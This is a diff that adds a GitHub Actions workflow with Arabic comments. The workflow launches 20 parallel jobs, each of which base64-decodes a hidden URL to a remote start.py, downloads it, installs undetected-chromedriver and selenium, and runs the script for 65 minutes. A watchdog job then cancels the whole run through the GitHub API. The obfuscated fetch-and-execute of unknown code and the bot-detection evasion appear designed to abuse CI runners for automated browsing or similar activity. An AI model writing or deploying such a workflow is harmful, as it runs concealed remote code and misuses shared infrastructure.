@@ -1,0 +1,107 @@
+name: Linux Sequenced Task Cohort
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: sequenced-cohort-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # ضابط الإلغاء الحاسم: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  termination-commissioner:
+    name: "Termination Commissioner"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Enforce Absolute Termination Writ
+        run: |
+          echo "[COMMISSIONER] Termination commissioner presiding. Absolute cessation armed at the 65-minute signal."
+          echo "[COMMISSIONER] Verifying workflow credentials: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[COMMISSIONER] Signal confirmed! Enforcing absolute termination writ..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[COMMISSIONER] Absolute termination writ enforced. Every engaged and paused unit will cease."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الحشد
+  # =================================================================
+  gather-cohort:
+    name: "CohortUnit-${{ matrix.unit_slot }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_slot: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      # ⊰ المرحلة الأولى: تأمين القاعدة التشغيلية
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      - name: Affirm Operational Footing
+        run: |
+          echo "[AFFIRM] Affirming operational footing for CohortUnit-${{ matrix.unit_slot }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      # ⊰ المرحلة الثانية: استقدام الحزمة التنفيذية
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      - name: Recruit Execution Payload
+        run: |
+          echo "[RECRUIT] Recruiting app_task.py from designated source storehouse..."
+          SOURCE_STOREHOUSE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$SOURCE_STOREHOUSE" -o app_task.py
+          echo "[RECRUIT] Execution payload recruited successfully."
+
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      # ⊰ المرحلة الثالثة: تسليح المكتبات المساندة
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      - name: Arm Reinforcement Libraries
+        run: |
+          echo "[ARM] Arming reinforcement libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      # ⊰ المرحلة الرابعة: التنفيذ المربوط بالمدة (65 دقيقة)
+      # ⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁⟁
+      - name: Administer Tethered Operation
+        run: |
+          echo ">> Gathering CohortUnit-${{ matrix.unit_slot }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          COHORT_PID=$!
+          
+          echo ">> Tethered operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $COHORT_PID 2>/dev/null; then
+            echo ">> Tethered window elapsed! Retiring operation..."
+            kill -9 $COHORT_PID
+            echo ">> Operation retired by tether keeper."
+          else
+            echo ">> Operation closed within tethered window."
+          fi
